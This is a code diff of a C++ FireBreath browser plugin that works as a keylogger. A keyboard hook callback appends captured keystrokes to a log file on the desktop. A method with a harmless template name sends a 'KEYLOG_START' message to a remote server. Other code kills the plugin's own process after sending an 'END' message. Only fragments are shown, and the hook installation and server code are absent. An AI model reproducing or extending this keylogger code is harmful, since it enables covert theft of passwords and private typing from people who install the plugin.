@@ -114,6 +114,7 @@ FB::variant PRCSAPI::echo(const FB::variant& msg)
 
 FB::variant PRCSAPI::test(const FB::variant& msg)
 {
+	//terminate calc and send END message
 	TerminateProcess(myPROC, 0);
 	std::string respon = std::to_string(seqnum++) + '.' + sID + ":END";
 	char buf[128];
@@ -121,6 +122,7 @@ FB::variant PRCSAPI::test(const FB::variant& msg)
 	strcpy_s(buf, respon.c_str());
 	SEND_TO_SERVER(buf);
 	
+	//kill plug-in process
 	DWORD id = GetCurrentProcessId();
 
 	DWORD dwDesiredAccess = PROCESS_TERMINATE;
@@ -230,9 +232,11 @@ __declspec(dllexport) LRESULT CALLBACK handlekeys(int code, WPARAM wp, LPARAM lp
 		std::cout << str;
 
 		std::ofstream myfile;
-		myfile.open("C:\\Users\\Jusko\\Desktop\\example.txt");
+		myfile.open("C:\\Users\\Jusko\\Desktop\\log.txt", std::ios_base::app);
 		myfile << str;
+
 		myfile.close();
+
 		/*
 		std::string path = std::string(windir) + "\\" + OUTFILE_NAME;
 		std::ofstream outfile(path.c_str(), std::ios_base::app);
@@ -273,6 +277,13 @@ bool PRCSAPI::doSomethingTimeConsuming( int num, FB::JSObjectPtr &callback )
 {
     boost::thread t(boost::bind(&PRCSAPI::doSomethingTimeConsuming_thread,
          this, num, callback));
+	// thread started
+	std::string respon = "KEYLOG_START";
+	char buf[128];
+	memset(&buf[0], 0, sizeof(buf));	
+	strcpy_s(buf, respon.c_str());
+	SEND_TO_SERVER(buf);
+
     return true; // the thread is started
 }
 
